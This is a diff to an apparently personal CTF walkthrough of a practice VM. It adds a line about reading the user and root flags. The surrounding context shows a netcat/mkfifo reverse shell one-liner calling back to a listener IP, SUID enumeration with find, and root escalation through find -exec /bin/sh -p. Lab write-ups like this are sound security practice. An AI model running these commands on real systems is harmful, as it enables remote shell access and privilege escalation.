@@ -14,5 +14,6 @@ Just a warmup, as its been a while. Actually spent most of my time working on a 
 6. Starting up `ncat.exe -nvlp 1337` on my windows machine, I caught a reverse shell via `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.154.1 1337 >/tmp/f`
 7. A `find / -perm -u=s 2>/dev/null` revealed `/usr/bin/find` under the suid list.
 8. Running `/usr/bin/find . -exec /bin/sh -p \; -quit` got me a root shell.
+9. There was a user flag, and root flag, both readable at this point (Er, but in spanish or something similar, after base64 decoding :)
 
 And that's all she wrote!
